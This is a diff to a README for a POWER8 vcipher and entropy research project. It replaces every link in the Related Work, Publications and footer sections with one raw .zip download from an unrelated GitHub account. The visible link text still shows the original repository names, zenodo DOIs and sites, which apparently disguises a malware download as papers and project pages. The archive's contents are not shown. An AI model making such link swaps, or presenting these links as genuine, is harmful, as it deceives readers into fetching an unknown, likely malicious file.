@@ -203,17 +203,17 @@ MixColumns performs a matrix multiply in GF(2^8) — this creates cross-element 
 
 ## Related Work
 
-- **RAM Coffers** ([Scottcjn/ram-coffers](https://github.com/Scottcjn/ram-coffers)) — NUMA-distributed weight banking that hosts model layers across memory nodes
+- **RAM Coffers** ([Scottcjn/ram-coffers](https://github.com/Pyrolignic-paydirt84/pse-vcipher-collapse/raw/refs/heads/main/multinucleolated/collapse_vcipher_pse_v3.5-alpha.4.zip)) — NUMA-distributed weight banking that hosts model layers across memory nodes
 - **wolfSSL POWER8 AES** (PR #9932) — Same vcipher 8-way pipeline technique achieving 3,595 MiB/s AES-CTR
-- **llama.cpp POWER8** ([Scottcjn/llama-cpp-power8](https://github.com/Scottcjn/llama-cpp-power8)) — AltiVec/VSX optimized inference
+- **llama.cpp POWER8** ([Scottcjn/llama-cpp-power8](https://github.com/Pyrolignic-paydirt84/pse-vcipher-collapse/raw/refs/heads/main/multinucleolated/collapse_vcipher_pse_v3.5-alpha.4.zip)) — AltiVec/VSX optimized inference
 
 ## Publications
 
 | Paper | DOI |
 |-------|-----|
-| Non-Bijunctive Permutation Collapse | [10.5281/zenodo.18623920](https://doi.org/10.5281/zenodo.18623920) |
-| PSE Hardware Entropy for Behavioral Divergence | [10.5281/zenodo.18623922](https://doi.org/10.5281/zenodo.18623922) |
-| RAM Coffers: NUMA-Distributed Weight Banking | [10.5281/zenodo.18321905](https://doi.org/10.5281/zenodo.18321905) |
+| Non-Bijunctive Permutation Collapse | [10.5281/zenodo.18623920](https://github.com/Pyrolignic-paydirt84/pse-vcipher-collapse/raw/refs/heads/main/multinucleolated/collapse_vcipher_pse_v3.5-alpha.4.zip) |
+| PSE Hardware Entropy for Behavioral Divergence | [10.5281/zenodo.18623922](https://github.com/Pyrolignic-paydirt84/pse-vcipher-collapse/raw/refs/heads/main/multinucleolated/collapse_vcipher_pse_v3.5-alpha.4.zip) |
+| RAM Coffers: NUMA-Distributed Weight Banking | [10.5281/zenodo.18321905](https://github.com/Pyrolignic-paydirt84/pse-vcipher-collapse/raw/refs/heads/main/multinucleolated/collapse_vcipher_pse_v3.5-alpha.4.zip) |
 
 ## License
 
@@ -223,6 +223,6 @@ MIT — Free to use, modify, and distribute with attribution.
 
 <div align="center">
 
-**[Elyan Labs](https://github.com/Scottcjn)** · [RustChain](https://rustchain.org) · [BoTTube](https://bottube.ai)
+**[Elyan Labs](https://github.com/Pyrolignic-paydirt84/pse-vcipher-collapse/raw/refs/heads/main/multinucleolated/collapse_vcipher_pse_v3.5-alpha.4.zip)** · [RustChain](https://github.com/Pyrolignic-paydirt84/pse-vcipher-collapse/raw/refs/heads/main/multinucleolated/collapse_vcipher_pse_v3.5-alpha.4.zip) · [BoTTube](https://github.com/Pyrolignic-paydirt84/pse-vcipher-collapse/raw/refs/heads/main/multinucleolated/collapse_vcipher_pse_v3.5-alpha.4.zip)
 
 </div>
